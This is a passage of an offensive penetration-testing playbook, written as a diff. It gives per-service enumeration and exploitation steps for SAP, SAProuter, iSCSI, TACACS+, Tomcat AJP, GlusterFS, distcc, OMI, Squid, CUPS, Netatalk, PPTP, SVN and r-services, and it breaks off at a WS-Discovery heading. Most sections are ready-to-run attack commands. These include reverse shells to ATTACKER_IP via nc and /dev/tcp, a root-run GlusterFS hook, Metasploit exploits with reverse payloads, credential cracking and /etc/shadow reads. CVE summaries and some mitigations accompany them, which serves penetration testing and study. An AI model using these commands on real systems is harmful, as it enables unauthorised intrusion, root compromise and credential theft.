+curl "http://<IP>:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id"
+
+# Data extraction / file existence via SOAP RFC modules
+msfconsole -qx "use auxiliary/scanner/sap/sap_soap_rfc_read_table; set RHOSTS <IP>; run; exit"
+
+# Lateral movement: trusted RFC jump from SM59 stored destinations reusing the same
+# admin id in a compromised source system opens the trusting target with remote privs.
+```
+Post-login: check tcodes SU01/SM59/RSPFPAR; weak params (`login/min_password_lng<8`, `snc/enable=0`, `gw/reg_no_conn_info<255`) validated with [SAPPV](https://github.com/damianStrojek/SAPPV). Reachable SAProuter -> pivot (see next section).
+
+### Notable CVEs
+No single canonical CVE here; the reliable wins are default creds, ConfigServlet RCE, and SOAP RFC `SXPG_COMMAND_EXECUTE`/`SXPG_CALL_SYSTEM` command injection when the RFC user is over-privileged. RFC callback abuse hinges on `rfc/callback_security_method` not enforcing an allowlist.
+
+---
+
+## SAProuter perimeter pivot and admin-command bypass (port 3299)
+
+SAProuter is a reverse proxy fronting internal SAP networks, commonly exposed on 3299/tcp through the perimeter firewall. It is an ideal pivot: map internal hosts/services through it, then tunnel Metasploit SAP modules to the internal landscape. Cross-ref [[pivoting-tunneling]].
+
+### Enumeration
+```bash
+nmap -sV -p 3299 <IP>                      # saprouter?; banner leaks "SAProuter <ver> on '<host>'"
+msfconsole -qx "use auxiliary/scanner/sap/sap_router_info_request; set RHOSTS <IP>; run; exit"
+# Probe internal hosts/services and infer ACLs through the router
+msfconsole -qx "use auxiliary/scanner/sap/sap_router_portscanner; set RHOSTS <IP>; set INSTANCES 00-50; set PORTS 32NN; run; exit"
+```
+
+### Exploitation / Attacks
+```bash
+# Pivot: run SAP modules through the router as a proxy (NI/SOCKS)
+msfconsole -qx "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem; \
+  set Proxies sapni:<ROUTER_IP>:3299; set RHOSTS 192.168.1.18; run; exit"
+
+# CVE-2022-27668 remote admin bypass via pysap: loopback tunnel to 0.0.0.0 then admin packet
+git clone https://github.com/OWASP/pysap && cd pysap
+python router_portfw.py -d <ROUTER_IP> -p 3299 -t 0.0.0.0 -r 3299 -a 127.0.0.1 -l 3299 -v
+python router_admin.py -s -d 127.0.0.1 -p 3299          # e.g. stop the remote router
+```
+
+### Notable CVEs
+- CVE-2022-27668 (CVSS 9.8, SAP Note 3158375): permissive `saprouttab` entries let an unauthenticated remote attacker tunnel to the router loopback via the 0.0.0.0 address and send administration packets (shutdown/trace/connection-kill) even without the `-X` remote-admin flag. Affects standalone SAProuter 7.22/7.53 and kernels 7.49/7.77/7.81/7.85-7.88. Fix: patch + remove `*` wildcards from `P`/`S` lines.
+
+---
+
+## iSCSI unauthenticated block-storage target mount (port 3260)
+
+iSCSI carries SCSI commands over TCP to give initiators block-level access to remote storage targets (SAN). When a target has no CHAP authentication (`AuthMethod None`), an attacker can discover, log in, and mount the raw block device, reading whole filesystems, VM disks, or database volumes offline.
+
+### Enumeration
+```bash
+# Nmap reports whether authentication is required
+nmap -sV --script=iscsi-info -p 3260 <IP>
+
+# Discover target IQNs behind the portal (may reveal internal/alternate IPs)
+sudo apt install open-iscsi
+iscsiadm -m discovery -t sendtargets -p <IP>:3260
+#   <IP>:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
+
+# Inspect a target's negotiated params (note auth.authmethod = None means no CHAP)
+iscsiadm -m node --targetname="iqn...vnxe" -p <IP>:3260
+```
+
+### Exploitation / Attacks
+```bash
+# Log in to an unauthenticated target, then the block device appears as /dev/sdX
+iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001...-vnxe" -p <IP>:3260 --login
+lsblk                                              # find the new device
+sudo mount -o ro /dev/sdX1 /mnt/iscsi              # mount and loot filesystem
+iscsiadm -m node --targetname="iqn...vnxe" -p <IP>:3260 --logout
+
+# NAT/virtual-IP gotcha: discovery registers the internal IP. Rename the node dir under
+# /etc/iscsi/nodes/<iqn>/ to the public IP and sed node.conn[0].address to it before login.
+```
+CHAP-protected targets: brute the shared secret (see brute-force notes) before mounting.
+
+### Notable CVEs
+No single headline CVE; the exposure is a target configured with `AuthMethod None` (or weak CHAP), reachable from an untrusted network. Shodan: `port:3260 AuthMethod`.
+
+---
+
+## TACACS+ shared-secret capture, offline crack and MitM bit-flip (port 49)
+
+TACACS+ is Cisco's AAA protocol for centralized auth to routers/switches/NAS. Legacy TACACS+ on 49/tcp does not encrypt transport: the header is cleartext and the body is only MD5-obfuscated with the shared secret. Capture the traffic, crack the secret offline, and you can decrypt all AAA exchanges and log into the network gear. TCP/300 is TACACS+ over TLS (RFC 9887) and resists these attacks.
+
+### Enumeration
+```bash
+nmap -sV -Pn -p 49,300 <IP>
+# In a capture, the cleartext header (type/seq_no/session_id) lets you carve AAA flows:
+tshark -r cap.pcap -Y "tcp.port == 49 || tcp.port == 300"
+```
+
+### Exploitation / Attacks
+```bash
+# Position with a MitM (ARP spoof, or TCP proxy/NAT in routed nets) to capture the exchange
+# Convert a captured TACACS+ packet + device prompt to a hashcat hash, then crack offline
+git clone https://github.com/GrrrDog/TacoTaco
+python3 tac2cat.py -t 1 -m "Password: " -p <hex_stream_from_wireshark> > tacacs.hash
+hashcat -m 16100 tacacs.hash rockyou.txt           # 16100 = TACACS+
+
+# Once the secret is cracked, load it into Wireshark to decrypt usernames + AV pairs
+# Active inline bypass without knowing the secret (legacy TACACS+ lacks integrity):
+python3 tacoflip.py -t <TACACS_SERVER_IP>          # flip/replay authz/acct fields for auth bypass
+
+# Faster path: recover the secret straight from device configs if you already have them
+rg -n "tacacs|aaa group server|tacacs-server| key " *.cfg
+#   look for legacy: tacacs-server host <ip> key <secret>
+```
+
+### Notable CVEs
+No CVE; the weakness is protocol-inherent to legacy TACACS+ (cleartext header, keyed-MD5 body with no strong integrity). `tacoflip.py` MitM auth/authz bypass and offline secret cracking are the practical attacks. Mitigation is TACACS+ over TLS 1.3 (TCP/300).
+
+---
+
+## Apache JServ Protocol (AJP) Ghostcat LFI and trusted-attribute abuse (port 8009)
+
+AJP/ajp13 is a binary protocol letting a front-end web server (Apache/Nginx) proxy to a Tomcat backend. The backend trusts the proxy to set internal request metadata, so an exposed 8009/tcp connector lets an attacker read `WEB-INF/web.xml` (Ghostcat LFI, often leaking creds) and forge trusted request attributes like `REMOTE_USER` and client-cert data. Reachable AJP is a high-value target, potentially RCE via Tomcat Manager.
+
+### Enumeration
+```bash
+nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
+nmap -p 8009 --script ajp-request \
+  --script-args 'path=/manager/html,method=GET,filename=ajp-manager.out' <IP>
+```
+
+### Exploitation / Attacks
+```bash
+# Ghostcat (CVE-2020-1938): read arbitrary WEB-INF files via include attributes
+python2 ghostcat.py -u <IP> -p 8009 -f WEB-INF/web.xml        # exploit-db 48143
+# Or craft ForwardRequest packets directly with AJPFuzzer
+java -jar ajpfuzzer_v0.7.jar
+#   connect <IP> 8009
+#   forwardrequest 2 "HTTP/1.1" "/" 127.0.0.1 <IP> <IP> 8009 false "Cookie:x=1" \
+#     "javax.servlet.include.path_info:/WEB-INF/web.xml,javax.servlet.include.servlet_path:/"
+#   genericfuzz ... "secret:FUZZ" /tmp/ajp_secret_candidates.txt   # brute an AJP secret
+
+# Reach Tomcat Manager through an AJP proxy -> deploy a WAR web shell = RCE
+git clone https://github.com/dvershinin/nginx_ajp_module     # or a2enmod proxy_ajp:
+#   ProxyPass / ajp://<IP>:8009/            (add secret=<AJP_SECRET> for modern Tomcat)
+# then browse http://127.0.0.1/manager/html and continue in the Tomcat playbook
+
+# Even when 8009 is not exposed: HTTP->AJP desync through mod_proxy_ajp can smuggle a
+# trusted AJP request. Test Apache httpd -> Tomcat stacks for CL/TE desync (see [[http-request-smuggling]]).
+```
+Request attributes to abuse when the app trusts proxy data: `REMOTE_USER`, `javax.servlet.request.X509Certificate`, `AJP_SSL_PROTOCOL`. Modern Tomcat 403s unknown attrs unless they match `allowedRequestAttributesPattern`, so a permissive regex is a finding.
+
+### Notable CVEs
+- CVE-2020-1938 (Ghostcat): Tomcat AJP connector allows reading/including arbitrary files under the webroot (e.g. `WEB-INF/web.xml`) and, if file upload exists, RCE. Patched at Tomcat 9.0.31 / 8.5.51 / 7.0.100, which also require an AJP secret and bind loopback by default.
+
+---
+
+## GlusterFS unauthenticated volume mount and shared-storage root RCE (port 24007)
+
+GlusterFS pools storage from many servers into one namespace. The management daemon `glusterd` listens on 24007/tcp; data bricks start at 49152/tcp (legacy clusters use 24008-24009). Default installs answer peer/volume RPC without authentication, letting an attacker enumerate and mount volumes, and the world-readable `gluster_shared_storage` volume holds root-run cron/hook templates that give cluster-wide RCE as root.
+
+### Enumeration
+```bash
+sudo apt install -y glusterfs-cli glusterfs-client
+nmap -sV -p 24007,49152 <IP>
+# Peer + volume recon (no auth in default setups)
+gluster --remote-host <IP> peer status
+gluster --remote-host <IP> volume info all
+gluster --version                                   # check per node; mixed versions common
+```
+
+### Exploitation / Attacks
+```bash
+# Mount an exported volume anonymously and loot it
+sudo mount -t glusterfs <IP>:/<vol_name> /mnt/gluster
+# blockers seen in /var/log/glusterfs/<vol>-*.log: TLS (transport.socket.ssl on) or
+# auth.allow CIDR ACL. If TLS-enforced, steal glusterfs.pem/.key/.ca from an authorized
+# client and drop them in /etc/ssl/ to satisfy mutual auth.
+
+# Root RCE via the shared-storage hook directory (CVE-2023-3775 lets any client mount it)
+sudo mount -t glusterfs <IP>:/gluster_shared_storage /tmp/gss
+cat > /tmp/gss/hooks/1/start/post/test.sh <<'EOF'
+#!/bin/bash
+nc -e /bin/bash ATTACKER_IP 4444 &
+EOF
+chmod +x /tmp/gss/hooks/1/start/post/test.sh
+# glusterd syncs the hook cluster-wide and runs it as root. If hooks/1/ is absent, try /ss_bricks/.
+```
+
+### Notable CVEs
+- CVE-2023-3775: incorrect permission validation lets any unauthenticated client mount the admin `gluster_shared_storage` volume, enabling the hook-based root RCE above. Affects < 10.5 / 11.1.
+- CVE-2022-48340: use-after-free in `dht_setxattr_mds_cbk` reachable over the network; remote DoS and probable RCE. Affects 10.0-10.4, 11.0; fixed 10.4.1 / 11.1.
+- CVE-2023-26253: out-of-bounds read in the FUSE notify handler; remote crash of `glusterfsd` via a malformed NOTIFY_REPLY XDR frame to 24007 (public PoC). Affects < 11.0.
+
+---
+
+## distcc daemon unauthenticated command execution (port 3632)
+
+distccd distributes compilation jobs across networked machines. The daemon on 3632/tcp historically executed attacker-supplied compiler commands with no authentication, so a reachable distccd is a direct pre-auth RCE (the classic Metasploitable foothold).
+
+### Enumeration
+```bash
+nmap -p 3632 <IP>                                   # 3632/tcp open distccd
+```
+
+### Exploitation / Attacks
+```bash
+# CVE-2004-2687: execute arbitrary commands as the distccd user
+nmap -p 3632 <IP> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
+msfconsole -qx "use exploit/unix/misc/distcc_exec; set RHOSTS <IP>; \
+  set PAYLOAD cmd/unix/reverse; set LHOST <ATTACKER>; run; exit"
+```
+
+### Notable CVEs
+- CVE-2004-2687: distcc 2.x daemon (any version configured to accept jobs from untrusted networks) executes commands passed by clients with no access control, yielding remote code execution as the daemon user. No patched version bump fixes the design; mitigate by binding to trusted hosts only (`--allow`).
+
+---
+
+## OMI / OMIGOD unauthenticated root RCE on Azure Linux (ports 5985/5986)
+
+OMI is Microsoft's open-source remote management agent (`omiengine`) auto-installed on Azure Linux VMs using Azure Automation, Log Analytics, Configuration Management, Diagnostics, etc. It runs as root listening on all interfaces (5985 http, 5986 https). A missing-auth flaw lets an unauthenticated attacker run commands as root via a single SOAP request to `/wsman`.
+
+### Enumeration
+```bash
+nmap -sV -p 5985,5986 <IP>
+curl -s -k https://<IP>:5986/wsman -H "Content-Type: application/soap+xml;charset=UTF-8" -d @- <<'EOF'
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body/></s:Envelope>
+EOF
+```
+
+### Exploitation / Attacks
+```bash
+# CVE-2021-38647 (OMIGOD): send ExecuteShellCommand with NO Authentication header -> root
+curl -s -k --header "Content-Type: application/soap+xml;charset=UTF-8" \
+  --data-binary @exploit.xml https://<IP>:5986/wsman
+# exploit.xml body runs a command as root:
+#   <p:ExecuteShellCommand_INPUT
+#      xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
+#     <p:command>id</p:command><p:timeout>0</p:timeout></p:ExecuteShellCommand_INPUT>
+git clone https://github.com/horizon3ai/CVE-2021-38647    # working PoC
+```
+
+### Notable CVEs
+- CVE-2021-38647 (OMIGOD, CVSS 9.8): OMI server accepts `/wsman` SOAP messages with no Authentication header and incorrectly authorizes the client; `ExecuteShellCommand` runs as root. Affects OMI < 1.6.8.1 on Azure Linux VMs (many enabled the vulnerable agent implicitly). Fix: update OMI to 1.6.8.1+.
+
+---
+
+## Squid proxy abuse for internal port scan and SSRF pivot (port 3128)
+
+Squid is a caching forward HTTP proxy on 3128/tcp. A misconfigured or open Squid becomes a pivot: relay traffic out (open proxy) or, more usefully, reach RFC1918/loopback services and cloud metadata that are otherwise unreachable, turning the proxy into an SSRF and internal-scan gateway. Cross-ref [[ssrf]] and [[pivoting-tunneling]].
+
+### Enumeration
+```bash
+nmap -Pn -sV -p 3128 --script http-open-proxy <IP>
+squidclient -h <IP> -p 3128 mgr:info                 # Cache Manager if squidclient present
+# Confirm egress + learn the proxy's public IP
+curl -x http://<IP>:3128 https://ifconfig.me -I
+curl -x http://<IP>:3128 http://example.com -v        # 407 = auth required
+curl -x http://user:pass@<IP>:3128 http://example.com -v
+# Cache Manager info leak (version, ACLs, peers, sometimes full config)
+curl http://<IP>:3128/squid-internal-mgr/menu
+curl http://<IP>:3128/squid-internal-mgr/config       # full running config if ACL weak
+curl -u any:PASSWORD http://<IP>:3128/squid-internal-mgr/config
+```
+
+### Exploitation / Attacks
+```bash
+# SSRF: reach loopback / internal / cloud metadata through the proxy
+curl -x http://<IP>:3128 http://127.0.0.1:8080/ -v
+curl -x http://<IP>:3128 http://169.254.169.254/latest/meta-data/ -v   # cloud IMDS
+# CONNECT tunnel to a normally unreachable internal TLS service
+openssl s_client -proxy <IP>:3128 -connect 10.10.10.20:8443 -quiet
+
+# Internal port scan "from" the proxy (SPOSE), or full pivot via proxychains
+python spose.py --proxy http://<IP>:3128 --target <IP>
+# proxychains: append `http <IP> 3128` (add `username password` if auth) to proxychains.conf
+proxychains nmap -sT -n -p- localhost
+proxychains curl http://127.0.0.1:9191 -v
+# Chain Browser -> Burp -> Squid (Burp upstream proxy) to intercept internal-only web UIs
+```
+
+### Notable CVEs
+No single pivotal CVE; the attack value is misconfiguration (open proxy, exposed `/squid-internal-mgr/`, weak `Safe_ports`/`SSL_ports`/`to_localhost` ACLs turning CONNECT into an arbitrary TCP tunnel). On outdated builds also test request-smuggling / lenient chunked-decoding / cache-poisoning bugs (Squid has a long advisory history, e.g. the 2023 "55 vulnerabilities / 35 0days" audit).
+
+## CUPS / IPP unauthenticated RCE chain (port 631)
+
+The Internet Printing Protocol rides on HTTP/1.1 over **631/tcp** (jobs, queue mgmt) with **631/udp** used by `cups-browsed` for zeroconf printer discovery. On any Linux/Unix box running CUPS the discovery daemon is the marquee target: it trusts attacker-supplied printer advertisements and fetches a remote PPD whose `FoomaticRIPCommandLine` runs a shell command on the next print job. Chain is pre-auth, network access to UDP/631 is enough. Also usable as a DDoS amplifier.
+
+### Enumeration
+```bash
+# Is CUPS/IPP up and what model/queues (631/tcp)
+nmap -sV -p631 --script "cups-info,cups-queue-info" <target>
+
+# KEY question: is cups-browsed listening on 631/UDP (the vuln surface)?
+nmap -sU -p631 <target>
+sudo ss -ulpn | grep 631            # local check: cups-browsed bound to udp/631
+
+# CUPS discovery + attribute pull with the bundled IPP tools
+ippfind --timeout 3 --txt -v "@local and port=631"     # multicast/UDP discovery
+ipptool -tv ipp://<IP>/ipp/print get-printer-attributes.test   # firmware, formats
+
+# Raw Get-Printer-Attributes over HTTP
+curl -s http://<IP>:631/ipp/print -H "Content-Type: application/ipp" --data-binary @getattr.ipp
+curl -s http://<IP>:631/printers/   # CUPS web UI / queue listing
+
+# Internet-wide exposure (70k+ CUPS hosts seen 2025)
+shodan search 'product:"CUPS (IPP)" port:631'
+```
+
+### Exploitation / Attacks
+```bash
+# cups-browsed RCE chain (CVE-2024-47076/47175/47176/47177)
+# 1. Stand up a fake IPP printer that serves a malicious PPD whose
+#    *FoomaticRIPCommandLine "<cmd>"  runs on job processing.
+#    PoC framework (evilcups) automates the fake printer + PPD:
+git clone https://github.com/evilsocket/evil-cups   # or RCESandwich PoC
+python3 evilcups.py <ATTACKER_IP> <TARGET_IP> "<cmd, e.g. touch /tmp/pwn>"
+
+# 2. Send a spoofed IPP "printer available" packet to the target's udp/631
+#    pointing cups-browsed at http://ATTACKER:PORT/printers/evil (CVE-2024-47176).
+#    cups-browsed auto-creates the printer and fetches your PPD without validation
+#    (CVE-2024-47076 / 47175).
+# 3. Trigger: command fires when a job is sent to the attacker-added queue
+#    (CVE-2024-47177 via foomatic-rip). Some setups a user must print;
+#    others auto-process. Wait for/print a job to detonate.
+lp -d <evil-queue-name> /etc/hostname
+
+# DDoS amplification angle: a single spoofed UDP/631 discovery packet makes each
+# CUPS host issue an outbound IPP request to a victim -> reflection/amplification.
+
+# cupsd symlink Listen abuse (CVE-2024-35235): root cupsd chmod 666's an
+# attacker-chosen path via a symlink in cupsd.conf Listen -> writable system
+# file -> local privesc, then RCE via a PPD with FoomaticRIPCommandLine.
+
+# Classic printer abuse (non-CUPS office devices)
+# - Unauth POST /ipp/print often accepted; malicious PostScript can call system()
+# - Job hijacking: Cancel-Job then Send-Document swaps someone's document
+# - SNMP default community 'public' leaks the queue name needed in the IPP URL
+```
+
+### Notable CVEs
+- **CVE-2024-47176** (cups-browsed): binds udp/631 and trusts any `Get-Printer-Attributes` IPP URL in a discovery packet. Entry point of the chain.
+- **CVE-2024-47076** (libcupsfilters): attacker-controlled IPP attributes from the fetched PPD are not sanitized into the system.
+- **CVE-2024-47175** (libppd): unsanitized IPP attributes written into the generated PPD, enabling injection of `FoomaticRIPCommandLine`.
+- **CVE-2024-47177** (cups-filters / foomatic-rip): `FoomaticRIPCommandLine` in the PPD executes arbitrary commands on print. Ensure **cups-filters >= 2.0.0**.
+- **CVE-2024-35235** (cupsd <= 2.4.8): symlink `Listen` -> arbitrary chmod 666 -> local privesc.
+- **CVE-2023-50739** (Lexmark IPP parser): heap overflow -> RCE over LAN/Wi-Fi.
+- **CVE-2023-0856** (Canon, Pwn2Own): stack overflow in the `sides` attribute -> RCE.
+- Mitigation: `systemctl stop/disable cups-browsed`; firewall udp/631; enforce ipps:// (TLS) + auth.
+
+---
+
+## AFP (Netatalk) unauthenticated NAS RCE (port 548)
+
+Apple Filing Protocol over TCP/DSI on **548/tcp**. Largely replaced by SMB on modern macOS but very much alive on NAS appliances (QNAP, Synology, WD, TrueNAS) via the open-source **Netatalk** daemon, where a string of pre-auth memory-corruption bugs yields **remote root**. Fingerprint output (`Machine Type: Netatalk`, exposed UAMs) tells you which login parser is reachable before you pick an exploit.
+
+### Enumeration
+```bash
+# Banner + version + non-DoS NSE scripts
+nmap -p 548 -sV --script "afp-* and not dos" <IP>
+
+# Metasploit server info (name, machine type, AFP version, UAMs)
+msfconsole -qx "use auxiliary/scanner/afp/afp_server_info; set RHOSTS <IP>; run; exit"
+
+# With creds: enumerate volumes, ACLs, files
+nmap -p 548 --script afp-serverinfo,afp-showmount,afp-ls \
+  --script-args 'afp.username=<USER>,afp.password=<PASS>,ls.maxdepth=2,ls.maxfiles=50' <IP>
+
+# Brute force (NSE or hydra)
+nmap -p 548 --script afp-brute <IP>
+hydra -L users.txt -P passwords.txt afp://<IP>
+
+# Mount a share (Linux, afpfs-ng) then hunt AppleDouble ._* metadata
+apt install afpfs-ng
+mkdir /mnt/afp && mount_afp afp://USER:PASS@<IP>/SHARE /mnt/afp
+```
+Watch the `afp-serverinfo` output: `Machine Type: Netatalk` = Unix/NAS not Apple; UAMs like `Cleartxt`/`Guest`/`DHX` reveal weak/legacy login paths; `afp-showmount` ACLs expose drop-box shares holding backups and `.appl` files.
+
+### Exploitation / Attacks
+```bash
+# parse_entries() pre-auth RCE, Netatalk <= 3.1.12 (CVE-2022-23121, CVSS 9.8)
+# Malicious AppleDouble header -> remote ROOT before auth. Delivered via DSI WRITE.
+msfconsole -qx "use exploit/linux/netatalk/parse_entries; \
+  set RHOSTS <IP>; set TARGET 0; \
+  set PAYLOAD linux/x64/meterpreter_reverse_tcp; run; exit"
+
+# DSI OpenSession OOB write, Netatalk 3.0.0-3.1.11 (CVE-2018-1160)
+# Unauthenticated code execution; Tenable published analysis + PoC.
+
+# CVE-2022-45188: crafted .appl -> heap overflow in afp_getappl.
+#   Relevant when you can WRITE files into a share and FCE/notify is on.
+# UAM-gated one-byte OOB writes (fixed 2.4.1/3.1.19/3.2.1):
+#   CVE-2024-38439 reachable via uams_clrtxt.so (ClearTxt FPLoginExt)
+#   CVE-2024-38440 reachable via uams_dhx.so   (DHX login)
+#   CVE-2024-38441 reachable via uams_guest.so (Guest login)
+# -> use the exposed-UAM list to choose the reachable parser.
+```
+
+### Notable CVEs
+- **CVE-2022-23121** Netatalk <=3.1.12 `parse_entries()` pre-auth RCE (root), CVSS 9.8.
+- **CVE-2018-1160** Netatalk 3.0.0-3.1.11 DSI OpenSession OOB write, unauth RCE.
+- **CVE-2022-45188** `afp_getappl` heap overflow via crafted `.appl` (write access).
+- **CVE-2023-42464** Spotlight RPC type confusion (needs `spotlight = yes`).
+- **CVE-2024-38439/38440/38441** UAM-dependent one-byte heap OOB writes.
+- **CVE-2022-22995** AppleDouble v2 symlink redirection -> arbitrary write/RCE (3.1.0-3.1.17).
+- **CVE-2010-0533** Mac OS X 10.6 AFP directory traversal (detected by `afp-path-vuln.nse`).
+
+---
+
+## PPTP VPN handshake capture -> offline NT-hash recovery (port 1723)
+
+Point-to-Point Tunneling Protocol: control channel on **1723/tcp**, PPP payload carried in **GRE (IP proto 47)**, auth almost always **MS-CHAPv2**. The value is not the control connection; it is that a sniffed MS-CHAPv2 handshake collapses to DES-derived material, so passive capture enables offline password / NT-hash recovery. Note a host can answer on 1723/tcp while the tunnel still fails because GRE is filtered.
+
+### Enumeration
+```bash
+nmap -Pn -sSV -p1723 <IP>
+nmap -Pn -sO --protocol 47 <IP>       # confirm GRE reachability, not just tcp/1723
+
+# Capture BOTH control + encapsulated PPP for the handshake
+sudo tcpdump -ni <iface> 'tcp port 1723 or gre' -w pptp-handshake.pcap
+tshark -r pptp-handshake.pcap -Y 'pptp || gre || ppp || chap'
+```
+
+### Exploitation / Attacks
+```bash
+# 1. Parse the capture and pull the MS-CHAPv2 material
+chapcrack.py parse -i pptp-handshake.pcap
+tshark -r pptp-handshake.pcap -Y 'ppp and chap'
+# Fields needed (RFC 2759): username, peer-challenge, authenticator-challenge, NT-Response
+
+# 2a. Crack with hashcat as NetNTLMv1/ESS (mode 5500)
+#     line: <user>::<domain_or_blank>:<peer_challenge>:<nt_response>:<authenticator_challenge>
+hashcat -m 5500 -a 0 mschapv2.hashes /usr/share/wordlists/rockyou.txt
+
+# 2b. Or crack challenge/response directly with asleap
+asleap -C <8-byte-challenge> -R <24-byte-response> -W /usr/share/wordlists/rockyou.txt
+
+# 3. NT-hash-first (skip password cracking) with a prepared NT-hash DB
+./assless-chaps <challenge> <response> <hashes.db>
+
+# 4. With recovered secret, decrypt the session and analyze post-auth traffic
+chapcrack.py decrypt -i pptp-handshake.pcap -o pptp-decrypted.pcap -n <recovered_nt_hash>
+```
+The recovered NT hash is valuable by itself: validate the crack, decrypt captures, and pivot into Windows credential-reuse checks. Even unrecovered, store the handshake and attack it offline later.
+
+### Notable CVEs
+No single CVE; the weakness is protocol-level. MS-CHAPv2 security effectively reduces to recovering DES-derived / NT-hash-equivalent secrets from a passive capture (Marlinspike/moxie0, 2012), which is why PPTP is deprecated. GRE-dependent data channel also causes silent tunnel failures behind firewalls.
+
+---
+
+## SVN svnserve source/credential leak + repo DoS (port 3690)
+
+Subversion centralized VCS. Native protocol on **3690/tcp** (svnserve); also served over HTTP(S) via `mod_dav_svn` and over `svn+ssh://`. Attack value is anonymous/weak-auth read of repositories that version build pipelines, deploy keys, and DB credentials, plus history mining.
+
+### Enumeration
+```bash
+nc -vn <IP> 3690                                   # banner grab
+svn ls svn://<IP>                                  # anonymous root listing
+svn ls -R svn://<IP>/repo                           # recursive
+svn info svn://<IP>/repo                             # metadata
+svn log  svn://<IP>/repo                             # commit history
+svn propget --revprop -r HEAD svn:log svn://<IP>/repo  # revprops (build creds/URLs/tokens)
+
+# Over HTTP(S) with mod_dav_svn (version leaks in response headers)
+svn ls https://<IP>/svn/repo --username guest --password ''
+
+# No lockout by default -> quick credential spray
+hydra -L users.txt -P passwords.txt svn://<IP>     # or the bash loop over svn ls
+```
+
+### Exploitation / Attacks
+```bash
+# 1. anon-access = read (or write) in svnserve.conf -> dump the repo
+svn checkout svn://<IP>/repo && cd repo
+grep -RniE "password|secret|token|api[_-]?key" .    # mine checked-out source
+
+# 2. Hooks + externals often hold plaintext creds / extra hosts
+#    (after checkout)
+cat hooks/pre-commit hooks/post-commit 2>/dev/null
+svn propget svn:externals -R .                      # pull additional/other-host paths
+
+# 3. svn+ssh restricted shells: try to smuggle subcommands past the wrapper
+ssh user@<IP> svnserve -t
+
+# 4. Filesystem access to the repo -> offline analysis, no creds
+svnadmin dump /path/repo ; svnlook author /path/repo ; svnlook dirs-changed /path/repo
+
+# CVE-2024-46901 DoS (needs commit rights): control char in a path corrupts the
+# repo and can crash mod_dav_svn workers. Cleanup requires svnadmin dump/filter/load.
+printf 'pwn' > /tmp/payload
+svnmucc -m "DoS" put /tmp/payload $'http://<IP>/svn/repo/trunk/bad\x01path.txt'
+
+# CVE-2024-45720 (Windows client): best-fit encoding of a crafted non-ASCII
+# repo URL/path -> argument injection in svn.exe. Phish a Windows dev to run
+# `svn status` on an attacker-named working copy/URL decoding to '" & calc.exe & "'.
+```
+
+### Notable CVEs
+- **CVE-2024-46901** mod_dav_svn control-char path DoS / repo corruption, SVN <=1.14.4 over HTTP(S), fixed 1.14.5.
+- **CVE-2024-45720** Windows-only `svn.exe` best-fit argument injection -> arbitrary program execution, <=1.14.3, fixed 1.14.4.
+
+---
+
+## r-services (rexec 512 / rlogin 513 / rsh 514)
+
+The Berkeley r-services suite: legacy remote-command / remote-login daemons that are insecure by design and still surface on old UNIX and network appliances. **rexec (512/tcp)** authenticates with a clear-text username+password; **rlogin (513/tcp)** and **rsh (514/tcp)** use host-trust via `~/.rhosts` and `/etc/hosts.equiv`, trusting an IP+DNS pair that is trivially spoofable on the LAN. If one port is open, always check the other two, they ship from the same package. Everything is clear-text, so a packet capture recovers creds without touching the target.
+
+### Enumeration
+```bash
+# All three at once
+nmap -sV -p 512,513,514 <target>
+
+# rexec: manual protocol replay (three NUL-terminated strings + command)
+(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
+# ask the server to connect back for stderr (firewall/filter fingerprint)
+nc -lvnp 4444 &
+printf '4444\0user\0password\0id; uname -a\0' | nc <target> 512
+
+# rexec username oracle: some rexecd return "Login incorrect." vs
+# "Password incorrect." -> validate users before spraying passwords
+printf '0\0root\0wrongpass\0id\0'            | nc -w2 <target> 512 | tail -c +2
+printf '0\0definitelynotreal\0wrongpass\0id\0' | nc -w2 <target> 512 | tail -c +2
+
+# rexec/rlogin/rsh legacy clients (inetutils / rsh-client package)
+apt-get install rsh-client inetutils-rexec
+```
+
+### Exploitation / Attacks
+```bash
+# --- rexec: credential brute + RCE (creds required) ---
+nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
+hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8   # also medusa -M REXEC / ncrack
+msfconsole -qx "use auxiliary/scanner/rservices/rexec_login; set RHOSTS <target>; \
+  set USER_FILE users.txt; set PASS_FILE passwords.txt; run; exit"
+# rexec runs the command via /bin/sh -c, so shell-escape to a reverse shell:
+rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
+
+# --- rsh / rlogin: .rhosts / hosts.equiv TRUST abuse (no password) ---
+# If ATTACKER_IP (or a spoofed source) is trusted, log in / run cmds with no creds:
+rlogin <target> -l root
+rsh <target> id
+rsh <target> -l domain\\user "cat /etc/shadow"
+hydra -L users.txt rlogin://<target>   # brute where trust is not open
+
+# Trust is IP+DNS based and spoofable on-LAN; a '+ +' in a user's ~/.rhosts
+# or a permissive /etc/hosts.equiv means ANY host/user is trusted.
+
+# --- Post-ex + lateral movement across all three ---
+# Clear-text sniff -> creds straight off the wire
+tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
+  awk -F"\\0" '{print $2":"$3" -> "$4}'
+# Loot stored trust/creds for reuse on the next host
+find / -xdev \( -name .netrc -o -name netrc -o -path '*/.rhosts' -o -name hosts.equiv \) 2>/dev/null
+find / -name .rhosts 2>/dev/null
+```
+
+### Notable CVEs
+No single marquee CVE; the whole suite is deprecated by design. Impact classes: clear-text credential sniffing (512), and `.rhosts`/`hosts.equiv` IP-spoofable trust bypass giving passwordless command execution (513/514). Replace with SSH; disable all three together (shared codebase). Mis-set `/etc/pam.d/rexec` (e.g. `pam_rootok`) can even yield a root shell.
+
+---
+
+## WS-Discovery device discovery + rogue responder (port 3702/UDP)
+
